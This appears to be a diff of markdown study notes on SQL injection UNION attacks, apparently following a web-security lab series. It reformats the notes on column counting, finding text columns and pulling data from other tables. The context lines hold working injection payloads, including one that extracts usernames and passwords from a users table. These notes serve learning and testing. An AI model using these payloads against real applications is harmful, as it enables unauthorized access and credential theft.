@@ -6,7 +6,8 @@ For a UNION query to work, two key requirements must be met:
 - The data types in each column must be compatible between the individual queries.
 
 ```
-SELECT product_name, price FROM products UNION SELECT username, age
+SELECT product_name, price FROM products 
+UNION SELECT username, age
 ```
 
 The query above met the requirements:
@@ -17,10 +18,11 @@ The query above met the requirements:
 | username | age |
 
 
-This one didn't meet the requirements
+This one didn't meet the requirements:
 
 ```
-SELECT product_name, price FROM products UNION SELECT id, username, password
+SELECT product_name, price FROM products 
+UNION SELECT id, username, password
 ```
 ## Determining the number of columns required in an SQL injection UNION attack
 Method 1:
@@ -40,9 +42,10 @@ Method 2:
 ' UNION SELECT NULL, NULL, NULL, NULL, NULL
 ```
 
-Indicator: error message.
+Indicator to detect: error message.
 
-# Lab: SQL injection UNION attack, determining the number of columns returned by the query
+# Labs
+## Lab #1: SQL injection UNION attack, determining the number of columns returned by the query
 
 
 Steps: 
@@ -59,7 +62,7 @@ category=Lifestyle' ORDER BY 1,2,3,4 -- # error
 category=Lifestyle' UNION SELECT NULL,NULL,NULL --
 ```
 
-# Lab: SQL injection UNION attack, finding a column containing text
+## Lab #2: SQL injection UNION attack, finding a column containing text
 
 Steps:
 
@@ -75,7 +78,7 @@ category=Pets' UNION SELECT null,'inject',null --
 category=Pets' UNION SELECT null,'inject','inject' --
 ```
 
-# Lab: SQL injection UNION attack, retrieving data from other tables 
+# Lab #3: SQL injection UNION attack, retrieving data from other tables 
 
 Suppose that:
 - The original query returns two columns, both of which can hold string data.
@@ -100,7 +103,7 @@ category=Lifestyles' UNION select username, password FROM users --
 ```
 4. Login
 
-# Lab: SQL injection UNION attack, retrieving multiple values in a single column
+## Lab #4: SQL injection UNION attack, retrieving multiple values in a single column
 
 > Note: Different databases use different syntax
 > Cheatsheet to examine the database version and which syntax to use
